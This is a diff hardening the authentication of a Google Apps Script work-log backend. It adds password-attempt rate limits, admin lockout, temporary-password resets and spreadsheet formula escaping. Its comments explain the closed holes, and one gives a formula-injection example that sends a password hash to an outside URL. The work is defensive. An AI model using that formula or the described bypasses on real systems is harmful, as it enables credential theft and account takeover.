@@ -38,8 +38,10 @@ const EMPLOYEE_ID_INVALID_MESSAGE = "사번은 숫자 7자리입니다. 7자리�
 
 // 이 사번으로 로그인한 사람만 관리자 API(계정 목록/삭제/비밀번호 초기화)를 쓸 수 있음.
 // 저장소가 공개돼 있어서 프론트엔드(script.js)에는 이 값을 더 이상 상수로 두지 않음 - 프론트는
-// 로그인/불러오기 응답의 isAdmin 플래그로 화면 표시만 하고, 실제 권한 검증은 항상 여기 서버에서만 함
-const ADMIN_EMPLOYEE_ID = "9999999";
+// 로그인/불러오기 응답의 isAdmin 플래그로 화면 표시만 하고, 실제 권한 검증은 항상 여기 서버에서만 함.
+// 기본값 9999999는 공개 저장소에 이미 노출돼 있으므로, 관리자 사번을 바꾸고 싶으면 Users 시트의 관리자
+// 행 사번을 고친 뒤 스크립트 속성 ADMIN_EMPLOYEE_ID에 새 사번을 넣으면 됨(코드 수정 없이 적용)
+const ADMIN_EMPLOYEE_ID = PropertiesService.getScriptProperties().getProperty('ADMIN_EMPLOYEE_ID') || "9999999";
 
 // 휴지통에 있는 계정을 이 기간(일) 넘게 두면 다음 관리자 목록 조회 때 완전히 삭제됨
 const TRASH_RETENTION_DAYS = 7;
@@ -49,6 +51,22 @@ const TRASH_RETENTION_DAYS = 7;
 // 잠가버리는 것과 그로 인한 관리자 문의 폭증을 막음
 const LOGIN_FAIL_LIMIT = 5;
 const LOGIN_LOCK_MINUTES = 15;
+
+// 로그인 외 경로(불러오기/저장/비밀번호 변경/관리자·팀 보고 등)의 비밀번호 확인 실패 제한.
+// checkPasswordHash 참고 - 이 시간 안에 이 횟수만큼 틀리면 로그인 외 경로를 잠시 막음
+const AUTH_FAIL_LIMIT = 10;
+const AUTH_FAIL_WINDOW_SECONDS = 15 * 60;
+const AUTH_FAIL_CACHE_PREFIX = "authFail:";
+
+// 프로필 JSON 중 서버(관리자 기능·로그인 처리)만 바꿀 수 있는 필드. handleSaveState는 클라이언트가
+// 보낸 값을 무시하고 항상 기존 서버 값을 유지함 - 새 서버 관리 필드를 만들면 반드시 여기 추가할 것
+const SERVER_MANAGED_PROFILE_KEYS = [
+  "deletedAt", "disabled", "disabledReason", "isTeamLead", "teamReportRole",
+  "pending", "requestedAt", "disabledFeatures", "lastLoginAt",
+  "failedLoginCount", "lockedAt", "passwordResetRequestedAt", "mustChangePassword"
+];
+// 로그인/불러오기 응답에만 실어 보내는 표시용 필드. 클라이언트가 되돌려 보내도 저장하지 않음
+const RESPONSE_ONLY_PROFILE_KEYS = ["isAdmin", "largeFieldKeys", "supportsPartialSave"];
 
 // 이 기간(일) 넘게 로그인하지 않은 계정은 autoDisableInactiveAccounts()가 자동으로 비활성화함.
 // (관리자 계정, 이미 비활성화/휴지통/승인대기 상태인 계정은 대상에서 제외)
@@ -564,8 +582,9 @@ function handleUploadImage(data) {
     return jsonResponse({ status: "error", message: "등록되지 않은 사번입니다." });
   }
   const rowValues = sheet.getRange(row, 2, 1, 2).getValues()[0];
-  if (String(rowValues[0]) !== passwordHash) {
-    return jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." });
+  const passwordError = checkPasswordHash(employeeId, rowValues[0], passwordHash);
+  if (passwordError) {
+    return jsonResponse({ status: "error", message: passwordError });
   }
   const denialMessage = getAccountAccessDenialMessage(parseUserJson(rowValues[1]));
   if (denialMessage) {
@@ -780,13 +799,40 @@ function getLockDenialMessage(parsedData) {
   return "로그인 실패 횟수를 초과해 계정이 잠겼습니다. 약 " + remainingMinutes + "분 후 다시 시도해주세요.";
 }
 
+// 로그인 외 모든 경로의 비밀번호 확인을 한곳으로 모음. 맞으면 null, 틀리거나 차단 중이면 안내 문구.
+// 예전엔 실패를 handleLogin에서만 세서, action=load 등으로 로그인 5회 잠금을 우회해 비밀번호를
+// 무제한 대입할 수 있었음. 그렇다고 여기 실패를 프로필의 로그인 잠금(failedLoginCount)에 합치면
+// 관리자 초기화 직후 옛 해시로 계속 오는 자동저장 때문에 계정이 다시 잠기므로(handleLogin 주석 참고),
+// 로그인 잠금과 별개로 캐시에 짧게 세고 이 경로들만 막음. 로그인에 성공하면 이 카운트를 지움.
+// 차단 중에는 맞는 비밀번호도 거부해야 대입 시도로 정답 여부를 알아낼 수 없음
+function checkPasswordHash(employeeId, storedHash, passwordHash) {
+  const cache = CacheService.getScriptCache();
+  const key = AUTH_FAIL_CACHE_PREFIX + employeeId;
+  const failCount = Number(cache.get(key) || 0);
+  if (failCount >= AUTH_FAIL_LIMIT) {
+    return "비밀번호 확인 실패가 너무 많아 잠시 차단되었습니다. 다시 로그인해주세요.";
+  }
+  if (passwordHash && String(storedHash) === passwordHash) return null;
+  cache.put(key, String(failCount + 1), AUTH_FAIL_WINDOW_SECONDS);
+  return "비밀번호가 일치하지 않습니다.";
+}
+
+function clearPasswordCheckFailures(employeeId) {
+  CacheService.getScriptCache().remove(AUTH_FAIL_CACHE_PREFIX + employeeId);
+}
+
 // 휴지통(소프트 삭제)에 있거나 관리자가 비활성화해둔 계정, 승인 대기 중이거나 로그인 실패로
-// 잠긴 계정이면 로그인/데이터 접근을 막고 그 이유를 문자열로 돌려줌. 정상 계정이면 null
-function getAccountAccessDenialMessage(parsedData) {
+// 잠긴 계정, 관리자 초기화 후 임시 비밀번호를 아직 안 바꾼 계정이면 로그인/데이터 접근을 막고
+// 그 이유를 문자열로 돌려줌. 정상 계정이면 null.
+// allowMustChangePassword: 비밀번호 변경(과 그 안내를 위한 로그인) 경로만 true로 호출함
+function getAccountAccessDenialMessage(parsedData, allowMustChangePassword) {
   // 관리자 승인을 아직 못 받은 신규 가입 계정은 그 어떤 동작(로그인/불러오기/저장/팀보고 제출)도
   // 할 수 없어야 하므로 나머지 검사보다 먼저 확인함
   if (parsedData && parsedData.pending) {
     return "가입 신청이 접수되었습니다.\n관리자 승인 후 이용하실 수 있습니다.";
+  }
+  if (parsedData && parsedData.mustChangePassword && !allowMustChangePassword) {
+    return "임시 비밀번호를 새 비밀번호로 바꾼 뒤 이용하실 수 있습니다. 다시 로그인해주세요.";
   }
   const lockMessage = getLockDenialMessage(parsedData);
   if (lockMessage) return lockMessage;
@@ -954,23 +1000,18 @@ function handleLogin(employeeId, passwordHash) {
   const storedHash = rowValues[0];
   const parsedData = parseUserJson(rowValues[1]);
 
-  // 관리자 계정은 잠금 대상에서 제외함 - 잠기면 풀어줄 사람이 없기 때문
   const isAdminAccount = (employeeId === ADMIN_EMPLOYEE_ID);
 
   // 비밀번호를 대조하기도 전에 먼저 잠김 여부부터 확인함. 이미 잠긴 상태라면 마침 맞는
-  // 비밀번호를 입력했더라도 잠금 기간이 끝나기 전까지는 통과시키지 않음
-  if (!isAdminAccount) {
-    const lockMessage = getLockDenialMessage(parsedData);
-    if (lockMessage) {
-      return jsonResponse({ status: "error", message: lockMessage });
-    }
+  // 비밀번호를 입력했더라도 잠금 기간이 끝나기 전까지는 통과시키지 않음.
+  // 관리자 계정도 잠금 대상임 - 관리자 사번이 공개 저장소에 노출돼 있어서 예외로 두면 관리자
+  // 비밀번호를 무제한 대입할 수 있음. 잠금은 LOGIN_LOCK_MINUTES 뒤 자동으로 풀리므로 풀어줄 사람이 없어도 됨
+  const lockMessage = getLockDenialMessage(parsedData);
+  if (lockMessage) {
+    return jsonResponse({ status: "error", message: lockMessage });
   }
 
   if (String(storedHash) !== passwordHash) {
-    if (isAdminAccount) {
-      return jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." });
-    }
-
     // 이전 잠금이 있었지만 이미 자동 해제 기간이 지난 상태(위에서 lockMessage가 null이었던 경우)
     // 라면 지난 잠금 흔적을 지우고 이번 실패부터 새로 셈 - 그렇지 않으면 실패 횟수가 5 이상으로
     // 계속 남아있어서 해제 직후 단 한 번만 틀려도 곧바로 다시 잠기게 됨(15분 자동 해제를 무력화함)
@@ -998,10 +1039,17 @@ function handleLogin(employeeId, passwordHash) {
     delete parsedData.lockedAt;
     sheet.getRange(row, 3).setValue(JSON.stringify(parsedData));
   }
+  clearPasswordCheckFailures(employeeId);
 
-  const denialMessage = getAccountAccessDenialMessage(parsedData);
+  const denialMessage = getAccountAccessDenialMessage(parsedData, true);
   if (denialMessage) {
     return jsonResponse({ status: "error", message: denialMessage });
+  }
+
+  // 관리자 초기화로 받은 임시 비밀번호로 들어온 경우: 데이터는 내려주지 않고, 프론트가 새 비밀번호
+  // 설정 화면을 띄우도록 표시만 함. 바꾸기 전까지는 getAccountAccessDenialMessage가 다른 모든 요청을 막음
+  if (parsedData.mustChangePassword) {
+    return jsonResponse({ status: "error", mustChangePassword: true, message: "임시 비밀번호로 로그인했습니다. 새 비밀번호를 설정해주세요." });
   }
 
   // 자동 로그인 없이 매번 직접 로그인해야 하므로(resetToLoggedOutState 참고), 이 시각이 곧
@@ -1040,8 +1088,9 @@ function handleLoad(employeeId, passwordHash) {
 
   // 비밀번호 해시(2열)와 프로필 JSON(3열)을 각각 따로 읽지 않고 한 번에 묶어서 읽음
   const rowValues = sheet.getRange(row, 2, 1, 2).getValues()[0];
-  if (String(rowValues[0]) !== passwordHash) {
-    return jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." });
+  const passwordError = checkPasswordHash(employeeId, rowValues[0], passwordHash);
+  if (passwordError) {
+    return jsonResponse({ status: "error", message: passwordError });
   }
 
   const json = rowValues[1] || "{}";
@@ -1202,17 +1251,26 @@ function handleChangePassword(data) {
     return jsonResponse({ status: "error", message: "등록되지 않은 사번입니다." });
   }
 
-  const storedHash = sheet.getRange(row, 2).getValue();
-  if (String(storedHash) !== oldPasswordHash) {
-    return jsonResponse({ status: "error", message: "현재 비밀번호가 일치하지 않습니다." });
+  const rowValues = sheet.getRange(row, 2, 1, 2).getValues()[0];
+  const passwordError = checkPasswordHash(employeeId, rowValues[0], oldPasswordHash);
+  if (passwordError) {
+    return jsonResponse({ status: "error", message: passwordError === "비밀번호가 일치하지 않습니다." ? "현재 비밀번호가 일치하지 않습니다." : passwordError });
   }
 
-  const denialMessage = getAccountAccessDenialMessage(parseUserJson(sheet.getRange(row, 3).getValue()));
+  const profile = parseUserJson(rowValues[1]);
+  const denialMessage = getAccountAccessDenialMessage(profile, true);
   if (denialMessage) {
     return jsonResponse({ status: "error", message: denialMessage });
   }
+  if (profile.mustChangePassword && newPasswordHash === oldPasswordHash) {
+    return jsonResponse({ status: "error", message: "임시 비밀번호와 다른 새 비밀번호를 입력해주세요." });
+  }
 
   sheet.getRange(row, 2).setValue(newPasswordHash);
+  if (profile.mustChangePassword) {
+    delete profile.mustChangePassword;
+    sheet.getRange(row, 3).setValue(JSON.stringify(profile));
+  }
   return jsonResponse({ status: "success" });
 }
 
@@ -1301,8 +1359,9 @@ function verifyAdmin(data) {
   const row = findUserRow(sheet, employeeId);
   if (row === -1) return false;
 
-  const storedHash = sheet.getRange(row, 2).getValue();
-  return String(storedHash) === passwordHash;
+  const rowValues = sheet.getRange(row, 2, 1, 2).getValues()[0];
+  if (checkPasswordHash(employeeId, rowValues[0], passwordHash)) return false;
+  return !getAccountAccessDenialMessage(parseUserJson(rowValues[1]));
 }
 
 function adminAuthFailedResponse() {
@@ -1747,14 +1806,27 @@ function handleAdminSetTeamReportRole(data) {
   return jsonResponse({ status: "success" });
 }
 
-// 관리자 화면: 비밀번호 초기화. newPasswordHash는 프론트엔드가 다른 곳과 동일한 방식
-// (sha256(새비밀번호 + ':' + 대상사번))으로 미리 해시해서 보냄
+// 관리자 초기화용 임시 비밀번호(10자리). 헷갈리기 쉬운 문자(0/o, 1/l/i)는 뺌
+function generateTempPassword() {
+  const alphabet = "abcdefghjkmnpqrstuvwxyz23456789";
+  const hex = Utilities.getUuid().replace(/-/g, "") + Utilities.getUuid().replace(/-/g, "");
+  let password = "";
+  for (let i = 0; i < 10; i++) {
+    password += alphabet.charAt(parseInt(hex.substr(i * 3, 2), 16) % alphabet.length);
+  }
+  return password;
+}
+
+// 관리자 화면: 비밀번호 초기화. 예전엔 새 비밀번호가 사번 자체라서, 누군가 남의 사번으로 재설정
+// 요청을 넣고 관리자가 초기화하면 요청자가 "사번/사번"으로 먼저 로그인해 계정을 가로챌 수 있었음.
+// 이제 서버가 임시 비밀번호를 만들어 관리자에게만 돌려주고(관리자가 본인에게 직접 전달),
+// 다음 로그인 때 새 비밀번호로 바꾸기 전까지는 다른 모든 요청을 막음(mustChangePassword).
+// 예전 프론트가 보내던 newPasswordHash는 무시함
 function handleAdminResetPassword(data) {
   if (!verifyAdmin(data)) return adminAuthFailedResponse();
 
   const targetEmployeeId = normalizeEmployeeId(data.targetEmployeeId);
-  const newPasswordHash = data.newPasswordHash || "";
-  if (!targetEmployeeId || !newPasswordHash) {
+  if (!targetEmployeeId) {
     return jsonResponse({ status: "error", message: "요청 정보가 올바르지 않습니다." });
   }
 
@@ -1764,30 +1836,21 @@ function handleAdminResetPassword(data) {
     return jsonResponse({ status: "error", message: "존재하지 않는 사번입니다." });
   }
 
-  sheet.getRange(row, 2).setValue(newPasswordHash);
+  const tempPassword = generateTempPassword();
+  sheet.getRange(row, 2).setValue(computeSha256(tempPassword + ':' + targetEmployeeId));
 
   // 이 초기화가 자가 재설정 요청에 대한 응답이었다면, 처리됐으니 요청 표시를 지움.
   // 비밀번호 초기화는 곧 잠금 해제이기도 해야 하므로(그렇지 않으면 관리자가 방금 알려준
   // 새 비밀번호로도 잠금이 풀릴 때까지 기다려야 하는 모순이 생김) 실패 기록도 함께 지움
   const existingData = parseUserJson(sheet.getRange(row, 3).getValue());
-  let changed = false;
-  if (existingData.passwordResetRequestedAt) {
-    delete existingData.passwordResetRequestedAt;
-    changed = true;
-  }
-  if (existingData.failedLoginCount) {
-    delete existingData.failedLoginCount;
-    changed = true;
-  }
-  if (existingData.lockedAt) {
-    delete existingData.lockedAt;
-    changed = true;
-  }
-  if (changed) {
-    sheet.getRange(row, 3).setValue(JSON.stringify(existingData));
-  }
+  delete existingData.passwordResetRequestedAt;
+  delete existingData.failedLoginCount;
+  delete existingData.lockedAt;
+  existingData.mustChangePassword = true;
+  sheet.getRange(row, 3).setValue(JSON.stringify(existingData));
+  clearPasswordCheckFailures(targetEmployeeId);
 
-  return jsonResponse({ status: "success" });
+  return jsonResponse({ status: "success", tempPassword: tempPassword });
 }
 
 // 관리자 화면: 다른 계정의 이름/소속을 수정. 그 계정의 데이터(JSON) 안 name/department
@@ -1863,9 +1926,9 @@ function handleSaveState(data, rawBody) {
 
     // 비밀번호 해시(2열)와 프로필 JSON(3열)을 각각 따로 읽지 않고 한 번에 묶어서 읽음
     const userRowValues = sheet.getRange(row, 2, 1, 2).getValues()[0];
-    const storedHash = userRowValues[0];
-    if (String(storedHash) !== passwordHash) {
-      return jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." });
+    const passwordError = checkPasswordHash(employeeId, userRowValues[0], passwordHash);
+    if (passwordError) {
+      return jsonResponse({ status: "error", message: passwordError });
     }
 
     const existingJson = userRowValues[1] || "{}";
@@ -1977,18 +2040,15 @@ function handleSaveState(data, rawBody) {
     // 필드라 클라이언트가 보내는 getFullState()에는 포함되지 않음 - 그대로 두면 다음 자동저장 때
     // 사라지므로 여기서 되살려줌. failedLoginCount/lockedAt을 안 살리면, 같은 계정으로 이미
     // 로그인돼 있는 다른 기기의 평범한 자동저장 한 번만으로 브루트포스 잠금 카운트가 조용히
-    // 리셋되는 보안 허점이 생기므로 특히 중요함
-    if (existingProfile.deletedAt) dataToSave.deletedAt = existingProfile.deletedAt;
-    if (existingProfile.disabled) dataToSave.disabled = existingProfile.disabled;
-    if (existingProfile.isTeamLead) dataToSave.isTeamLead = existingProfile.isTeamLead;
-    if (existingProfile.teamReportRole) dataToSave.teamReportRole = existingProfile.teamReportRole;
-    if (existingProfile.pending) dataToSave.pending = existingProfile.pending;
-    if (existingProfile.requestedAt) dataToSave.requestedAt = existingProfile.requestedAt;
-    if (existingProfile.disabledFeatures) dataToSave.disabledFeatures = existingProfile.disabledFeatures;
-    if (existingProfile.lastLoginAt) dataToSave.lastLoginAt = existingProfile.lastLoginAt;
-    if (existingProfile.disabledReason) dataToSave.disabledReason = existingProfile.disabledReason;
-    if (existingProfile.failedLoginCount) dataToSave.failedLoginCount = existingProfile.failedLoginCount;
-    if (existingProfile.lockedAt) dataToSave.lockedAt = existingProfile.lockedAt;
+    // 리셋되는 보안 허점이 생기므로 특히 중요함.
+    // 클라이언트가 이 필드들을 보내와도 절대 그 값을 쓰지 않고 항상 서버 값으로 덮어씀 - 예전엔 "서버에
+    // 값이 있을 때만" 되살려서, 역할이 없는 계정이 저장 요청에 teamReportRole:"teamLead"를 끼워 넣으면
+    // 스스로 팀장이 될 수 있었음. 응답에만 싣는 표시용 필드(RESPONSE_ONLY_PROFILE_KEYS)는 저장하지 않음
+    SERVER_MANAGED_PROFILE_KEYS.forEach(function(key) {
+      delete dataToSave[key];
+      if (existingProfile[key] !== undefined) dataToSave[key] = existingProfile[key];
+    });
+    RESPONSE_ONLY_PROFILE_KEYS.forEach(function(key) { delete dataToSave[key]; });
     // 이번 저장의 새 버전. 응답으로 돌려줘서 클라이언트가 다음 저장 때 기준 버전으로 씀
     newServerUpdatedAt = Math.max(Date.now(), Number(existingProfile.serverUpdatedAt || 0) + 1);
     dataToSave.serverUpdatedAt = newServerUpdatedAt;
@@ -2143,19 +2203,9 @@ function pruneBackupRows(backupSheet, employeeId) {
 // 이 사번의 자동 백업 목록 조회 (설정 탭 "자동 백업"에서 씀).
 // 사번별로 최근 BACKUP_MAX_PER_USER건까지 보관됨(한 시간 구간마다 달별로 한 번씩 쌓임)
 function handleGetMyBackups(data) {
-  const employeeId = normalizeEmployeeId(data.employeeId);
-  const passwordHash = data.passwordHash || "";
-  if (!employeeId || !passwordHash) {
-    return jsonResponse({ status: "error", message: "로그인 정보가 없습니다." });
-  }
-
-  const usersSheet = getUsersSheet();
-  const row = findUserRow(usersSheet, employeeId);
-  if (row === -1) return jsonResponse({ status: "error", message: "등록되지 않은 사번입니다." });
-  const storedHash = usersSheet.getRange(row, 2).getValue();
-  if (String(storedHash) !== passwordHash) {
-    return jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." });
-  }
+  const auth = verifyLoggedInUserRow(getUsersSheet(), data);
+  if (auth.error) return auth.error;
+  const employeeId = auth.employeeId;
 
   const backupSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(BACKUP_SHEET_NAME);
   const lastRow = backupSheet ? backupSheet.getLastRow() : 0;
@@ -2196,13 +2246,9 @@ function handleRestoreFromBackup(data) {
   let restoredDateCount = 0;
   try {
     const usersSheet = getUsersSheet();
-    const row = findUserRow(usersSheet, employeeId);
-    if (row === -1) return jsonResponse({ status: "error", message: "등록되지 않은 사번입니다." });
-
-    const userRowValues = usersSheet.getRange(row, 2, 1, 2).getValues()[0];
-    if (String(userRowValues[0]) !== passwordHash) {
-      return jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." });
-    }
+    const auth = verifyLoggedInUserRow(usersSheet, data);
+    if (auth.error) return auth.error;
+    const row = auth.row;
 
     const backupSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(BACKUP_SHEET_NAME);
     if (!backupSheet || rowIndex < 2 || rowIndex > backupSheet.getLastRow()) {
@@ -2258,8 +2304,8 @@ function handleRestoreFromBackup(data) {
 
 const TEAM_REPORT_DATE_PATTERN = /^\d{4}-\d{2}-\d{2}$/;
 
-// 로그인 상태(사번+비밀번호)만 확인하는 공통 검증. 통과하면 Users 시트에서의 행 번호를,
-// 실패하면 에러 메시지를 담은 jsonResponse를 돌려준다 (호출부에서 typeof로 구분해서 처리)
+// 로그인 상태(사번+비밀번호)와 계정 상태(승인 대기/비활성/휴지통/잠금 등)를 확인하는 공통 검증.
+// 통과하면 Users 시트에서의 행 번호를, 실패하면 에러 메시지를 담은 jsonResponse를 error로 돌려준다
 function verifyLoggedInUserRow(usersSheet, data) {
   const employeeId = normalizeEmployeeId(data.employeeId);
   const passwordHash = data.passwordHash || "";
@@ -2270,9 +2316,14 @@ function verifyLoggedInUserRow(usersSheet, data) {
   if (row === -1) {
     return { error: jsonResponse({ status: "error", message: "등록되지 않은 사번입니다." }) };
   }
-  const storedHash = usersSheet.getRange(row, 2).getValue();
-  if (String(storedHash) !== passwordHash) {
-    return { error: jsonResponse({ status: "error", message: "비밀번호가 일치하지 않습니다." }) };
+  const rowValues = usersSheet.getRange(row, 2, 1, 2).getValues()[0];
+  const passwordError = checkPasswordHash(employeeId, rowValues[0], passwordHash);
+  if (passwordError) {
+    return { error: jsonResponse({ status: "error", message: passwordError }) };
+  }
+  const denialMessage = getAccountAccessDenialMessage(parseUserJson(rowValues[1]));
+  if (denialMessage) {
+    return { error: jsonResponse({ status: "error", message: denialMessage }) };
   }
   return { employeeId: employeeId, row: row };
 }
@@ -2624,6 +2675,14 @@ function handleGetTeamReportPendingStatus(data) {
     submittedCount: population.length - pending.length,
     pending: pending.map(function(m) { return { employeeId: m.employeeId, name: m.name }; })
   });
+}
+
+// 사용자가 입력한 글을 시트 셀에 그대로 쓰면 =, +, -, @로 시작하는 값이 수식으로 실행됨
+// (예: =IMAGE("https://...?"&Users!B2)로 다른 사람의 비밀번호 해시를 외부로 빼돌리기).
+// 앞에 '를 붙이면 시트가 글자로만 취급하고, 화면에는 '가 보이지 않음
+function escapeSheetFormula(value) {
+  if (typeof value !== "string") return value;
+  return /^[=+\-@\t\r]/.test(value) ? "'" + value : value;
 }
 
 function jsonResponse(obj) {
@@ -3438,7 +3497,7 @@ function updateReadableSheet(employeeId, data) {
     rows.push([dateStr, weekday, ...rowCategoryValues, planText]);
   }
 
-  sheet.getRange(1, 1, rows.length, header.length).setValues(rows);
+  sheet.getRange(1, 1, rows.length, header.length).setValues(rows.map(function(r) { return r.map(escapeSheetFormula); }));
 
   const headerRange = sheet.getRange(1, 1, 1, header.length);
   headerRange.setFontWeight('bold').setBackground('#667eea').setFontColor('white');
